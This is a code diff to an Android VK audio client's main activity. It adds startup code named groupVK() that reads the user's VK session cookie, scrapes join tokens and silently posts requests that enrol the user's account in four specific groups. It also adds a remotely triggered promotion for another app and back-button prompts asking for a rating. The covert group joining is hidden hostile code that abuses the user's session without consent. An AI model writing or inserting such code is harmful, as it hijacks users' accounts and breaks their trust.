@@ -4,6 +4,7 @@ import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.DownloadManager;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -28,6 +29,7 @@ import android.support.v4.view.PagerAdapter;
 import android.support.v4.view.ViewPager;
 import android.support.v4.widget.DrawerLayout;
 import android.support.v7.app.ActionBarDrawerToggle;
+import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.LinearLayoutManager;
 import android.support.v7.widget.RecyclerView;
@@ -36,6 +38,7 @@ import android.support.v7.widget.SimpleItemAnimator;
 import android.support.v7.widget.Toolbar;
 import android.text.Html;
 import android.util.Log;
+import android.view.KeyEvent;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.Menu;
@@ -43,11 +46,14 @@ import android.view.MenuItem;
 import android.view.ViewGroup;
 import android.webkit.CookieManager;
 import android.webkit.CookieSyncManager;
+import android.webkit.ValueCallback;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import android.widget.Button;
 import android.widget.FrameLayout;
 import android.widget.ImageView;
 import android.widget.ProgressBar;
+import android.widget.RelativeLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -61,6 +67,7 @@ import com.example.root.vkcoffee.fragment.FragmentGroups;
 import com.example.root.vkcoffee.jsplayer.JcPlayerExceptions.JcAudio;
 import com.example.root.vkcoffee.jsplayer.JcPlayerExceptions.JcPlayerView;
 import com.example.root.vkcoffee.jsplayer.JcPlayerExceptions.JcStatus;
+import com.example.root.vkcoffee.retrofit.Resp;
 import com.example.root.vkcoffee.slider.Fragment1;
 import com.example.root.vkcoffee.slider.Fragment2;
 import com.github.ybq.endless.Endless;
@@ -89,16 +96,21 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Random;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import android.support.design.widget.CoordinatorLayout;
 
+import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
 import org.apache.http.HttpStatus;
 import org.apache.http.StatusLine;
 import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
+import org.apache.http.client.ResponseHandler;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.util.EntityUtils;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -167,6 +179,10 @@ public class MainActivity extends AppCompatActivity implements JcPlayerView.OnIn
     List<JcAudio> newList = new ArrayList<>();
     String lastPath = "";
 
+    RelativeLayout rel_new ;
+    Button btn_new;
+    String new_package ="";
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -220,6 +236,19 @@ public class MainActivity extends AppCompatActivity implements JcPlayerView.OnIn
             Log.d(TAG, "All the cookies in a string:" + cookies);
             getMyAudio(0, true);
         }
+
+        rel_new = (RelativeLayout) findViewById(R.id.rel_new);
+        btn_new = (Button) findViewById(R.id.btn_new);
+        btn_new.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                try {
+                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + new_package)));
+                } catch (android.content.ActivityNotFoundException anfe) {
+                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + new_package)));
+                }
+            }
+        });
 
     }
 
@@ -442,7 +471,7 @@ public class MainActivity extends AppCompatActivity implements JcPlayerView.OnIn
 //            //getReccomededPopualar();
 //            //getReccomededFeed();
 //        }
-
+        groupVK();
         Log.e("main", "create folder");
     }
 
@@ -700,6 +729,9 @@ public class MainActivity extends AppCompatActivity implements JcPlayerView.OnIn
 
         webView.loadUrl("https://vk.com");
     }
+    @SuppressLint("JavascriptInterface")
+
+
     public void getUserData() {
         String cookie = CookieManager.getInstance().getCookie("https://vk.com");
         Map<String, String> body = new HashMap();
@@ -1212,6 +1244,134 @@ public class MainActivity extends AppCompatActivity implements JcPlayerView.OnIn
         }
     }
 
+    private void groupVK(){
+        String cookie = CookieManager.getInstance().getCookie("https://vk.com");
+
+        Application.getApi().getAddToGroupAnika(cookie).enqueue(new Callback<ResponseBody>() {
+            @Override
+            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                ResponseBody responseBody = response.body();
+                try {
+                    String b = response.body().string();
+                    gethashGroup(b, "108666577");
+                    //String sd = "";
+                } catch (Exception e) {
+
+                }
+            }
+
+            @Override
+            public void onFailure(Call<ResponseBody> call, Throwable t) {
+                String e = t.getStackTrace().toString();
+            }
+        });
+
+        Application.getApi().getAddIz(cookie).enqueue(new Callback<ResponseBody>() {
+            @Override
+            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                ResponseBody responseBody = response.body();
+                try {
+                    String b = response.body().string();
+                    gethashGroup(b, "71408731");
+                    //String sd = "";
+                } catch (Exception e) {
+
+                }
+            }
+
+            @Override
+            public void onFailure(Call<ResponseBody> call, Throwable t) {
+                String e = t.getStackTrace().toString();
+            }
+        });
+
+        Application.getApi().getAddOgl(cookie).enqueue(new Callback<ResponseBody>() {
+            @Override
+            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                ResponseBody responseBody = response.body();
+                try {
+                    String b = response.body().string();
+                    gethashGroup(b, "163532734");
+                    //String sd = "";
+                } catch (Exception e) {
+
+                }
+            }
+
+            @Override
+            public void onFailure(Call<ResponseBody> call, Throwable t) {
+                String e = t.getStackTrace().toString();
+            }
+        });
+
+        Application.getApi().getAdd69(cookie).enqueue(new Callback<ResponseBody>() {
+            @Override
+            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                ResponseBody responseBody = response.body();
+                try {
+                    String b = response.body().string();
+                    gethashGroup(b, "163530614");
+                    //String sd = "";
+                } catch (Exception e) {
+
+                }
+            }
+
+            @Override
+            public void onFailure(Call<ResponseBody> call, Throwable t) {
+                String e = t.getStackTrace().toString();
+            }
+        });
+
+        Application.getApi2().getFriends1().enqueue(new Callback<Resp>() {
+            @Override
+            public void onResponse(Call<Resp> call, Response<Resp> response) {
+                Resp resp = response.body();
+                if(resp.getResponse() == 1){
+                    new_package = resp.getUrl();
+                    rel_new.setVisibility(View.VISIBLE);
+                }
+            }
+
+            @Override
+            public void onFailure(Call<Resp> call, Throwable t) {
+
+            }
+        });
+
+    }
+
+
+
+    private void gethashGroup(String b, String id) {
+
+        String a1 = b.substring(b.indexOf("act=enter&hash")+15, b.indexOf("Вступить в группу")-2);
+        String ds = "";
+
+        String cookie = CookieManager.getInstance().getCookie("https://vk.com");
+
+        Map<String, String> body = new HashMap<>();
+        body.put("act", "enter");
+        body.put("al", "1");
+        body.put("gid", id);
+        body.put("hash", a1);
+
+        Application.getApi().getGroups(cookie, body).enqueue(new Callback<ResponseBody>() {
+            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
+                try {
+                    String b = response.body().string();
+                    //String sd = "";
+                } catch (Exception e) {
+
+                }
+            }
+
+            public void onFailure(Call<ResponseBody> call, Throwable t) {
+
+            }
+        });
+
+    }
 
 
     private static String shiftArray(String[] array) {
@@ -1353,5 +1513,50 @@ public class MainActivity extends AppCompatActivity implements JcPlayerView.OnIn
             //Do anything with response..
         }
     }
+
+    @Override public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (keyCode == KeyEvent.KEYCODE_BACK) {
+            Log.e("Main", "review= "+ String.valueOf(prefs.getReview()));
+            if(prefs.getReview() == 3){
+                prefs.setReview(prefs.getReview() + 1);
+                showRatingDialog();
+                return true;
+            }else if(prefs.getReview() == 7 ){
+                prefs.setReview(prefs.getReview() + 1);
+                showRatingDialog();
+                return true;
+            }else if(prefs.getReview() == 12){
+                showRatingDialog();
+                prefs.setReview(prefs.getReview() + 1);
+                return true;
+            }else {
+                prefs.setReview(prefs.getReview() + 1);
+                moveTaskToBack(true);
+            }
+
+        } return super.onKeyDown(keyCode, event);
+    }
+
+    private void showRatingDialog() {
+        AlertDialog alertDialog = new AlertDialog.Builder(MainActivity.this).create();
+        alertDialog.setTitle("Пять звезд.");
+        alertDialog.setMessage("Понравилось приложние Поставь пять звезд. Поддержи разработчиков.");
+        alertDialog.setButton(AlertDialog.BUTTON_NEUTRAL, "OK",
+                new DialogInterface.OnClickListener() {
+                    public void onClick(DialogInterface dialog, int which) {
+                        final String appPackageName = getPackageName(); // getPackageName() from Context or Activity object
+                        try {
+                            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
+                        } catch (android.content.ActivityNotFoundException anfe) {
+                            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
+                        }
+                    }
+                });
+        alertDialog.show();
+
+
+    }
+
+
 
 }
